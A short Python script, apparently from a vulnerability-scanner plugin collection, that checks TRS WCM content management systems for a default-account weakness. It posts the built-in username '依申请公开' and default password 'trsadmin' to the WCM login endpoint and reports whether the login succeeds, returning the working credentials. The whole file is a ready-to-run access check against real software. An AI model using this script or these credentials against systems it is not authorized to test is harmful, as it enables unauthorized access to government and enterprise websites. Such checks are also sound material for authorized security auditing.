#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm系统默认账户漏洞
referer: unknown
author: Lucifer
description: TRS wcm系统中存在"依申请公开"这个默认用户,默认密码是trsadmin,可直接登录。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['TRS wcm系统默认账户漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
            "Content-Type":"application/x-www-form-urlencoded",
            "Referer":url+"/wcm/app/login.jsp"
        }
        payload = "/wcm/app/login_dowith.jsp"
        vulnurl = url + payload
        post_data = {
            "UserName":"依申请公开",
            "PassWord":"trsadmin"
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"WCM IMPORTS BEGIN" in req.text and r"main.jsp" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    